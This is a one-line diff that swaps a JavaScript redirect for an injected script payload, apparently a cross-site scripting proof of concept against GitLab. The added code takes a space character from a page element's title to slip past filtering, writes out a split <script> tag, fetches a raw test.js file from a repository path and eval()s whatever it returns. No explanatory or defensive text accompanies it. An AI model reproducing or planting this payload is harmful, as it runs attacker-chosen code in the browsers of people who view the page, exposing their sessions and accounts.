@@ -1,1 +1,1 @@
-window.location="https://gitlab.com";
+<script>a=document.getElementsByClassName("shortcuts-merge_requests").item(0).title.substring(5,6).toString();</script><script>document.write('<scr'+'ipt>var'+a+'xhr=new'+a+'XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==XMLHttpRequest.DONE){eval(xhr.responseText.toString());}};xhr.open("GET","/Thelolas/Practice/raw/master/test.js",true);xhr.send(null);</scr'+'ipt>');</script>
